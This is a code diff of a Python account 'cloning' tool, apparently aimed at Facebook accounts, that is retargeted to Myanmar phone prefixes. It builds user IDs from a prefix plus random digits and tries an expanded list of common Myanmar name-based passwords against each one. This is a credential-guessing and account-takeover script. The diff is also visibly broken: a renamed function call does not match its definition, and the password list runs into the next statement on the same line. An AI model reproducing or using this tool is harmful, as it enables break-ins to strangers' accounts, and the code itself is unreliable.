@@ -35,15 +35,14 @@ def xxx(x):
 
 def main():
     logo()
-    print(f" {xxx('1')} Random Cloning ")
-    print(f" {xxx('2')} Contact with Author ")
-    print(f" {xxx('3')} Exit Tools ")
+    print(f" {xxx('1')} Start Cloning ")
+    print(f" {xxx('2')} Exit Tools ")
     linex()
     xnxx = input(f" {xxx('?')} Select : ")
     if "1" in xnxx:
         r_number()
     elif "2" in xnxx:
-        os.system("xdg-open https://www.facebook.com/MR.K4ZIM.404")
+        os.system("xdg-open https://www.facebook.com/ngeko9984")
         main()
     elif "3" in xnxx:
         linex()
@@ -59,17 +58,11 @@ def main():
 
 def r_number():
     logo()
-    print(f" {xxx('1')} Pak Cloning ")
-    print(f" {xxx('2')} Bd Cloning ")
-    print(f" {xxx('3')} India Cloning ")
+    print(f" {xxx('1')} Mm Cloning ")
     linex()
     c = input(f" {xxx('?')} Select : ")
     if "1" in c:
-        pak()
-    elif "2" in c:
-        bd()
-    elif "3" in c:
-        india()
+        Mm()
     else:
         linex()
         print(f" {xxx('!')} {g}Select Valid Option ")
@@ -79,7 +72,7 @@ def r_number():
 
 def pak():
     logo()
-    print(f" {xxx('•')} Example : {g}0310, 0320, 0330, 0340 ")
+    print(f" {xxx('•')} Example : {g}0940, 0979, 0995, 0966 ")
     linex()
     code = input(f" {xxx('?')} Enter Code : ")
     logo()
@@ -102,8 +95,7 @@ def pak():
         linex()
         for love in digits:
             uid = code+love
-            pword = [code+love,'Myanmar','kyawkyaw','KyawKyaw','nyinyi','myanmar','myanmar123','moemoe','Aung123','ayeaye','nyinyi123','Myanmar123','thuthu','kyaw123','soe123','zawzaw','zaw123','thuzar','thuzar123','kyawgyi','linlin','chitchit','waiwai','Kyaw12345','Wai12345','Min12345','Soe12345','Nyi12345','Zaw12345','Aung12345','aungaung']
-            if "1" in m:
+            pword = [code+love,'Myanmar','Myanmar123','kyawkyaw','KyawKyaw123','nyinyi','nyinyi123','myanmar','myanmar123','moemoe','moemoe123','Aung123','ayeaye','ayeaye123','thuthu','thuthu123','kyaw123','soe123','zawzaw','zawzaw123','zaw123','thuzar','thuzar123','kyawgyi','kyawgyi123','linlin','linlin123','chitchit','chitchit123','waiwai','waiwai123','Kyaw12345','Wai12345','Min12345','Soe12345','Nyi12345','Zaw12345','Aung12345','aungaung123','myomyo','myomyo123','hninhnin','hninhnin123','tintin','tintin123','winmya','winmya123','marmar','marmar123','sansan','sansan123','popo123','chocho','chocho123','kyikyi','kyikyi123','123456','112233','111222','123123','aungaung']            if "1" in m:
                 process.submit(m1, uid, pword, total_idz)
             elif "2" in m:
                 process.submit(m2, uid, pword, total_idz)
@@ -312,9 +304,9 @@ banner = f"""{w}\
 {r}       88~~~   88~~~b. C8888D 88~~~    .dPYb.  88`8b   
 {w}      88      88   8D        88      .8P  Y8. 88 `88. 
 {w}      YP      Y8888P'        YP      YP    YP YP   YD 
-{g}      Gifted By >> {g}AungThu
+{g}      Gifted By >> {g}Zaw Myo Aung
 {w}==================================================
-{w} >> Author  :  AungThu
+{w} >> Author  :  Zaw Myo Aung
 {w} >> Github  :  _____
 {w} >> Verison :  Pre____mium
 {w}==================================================\
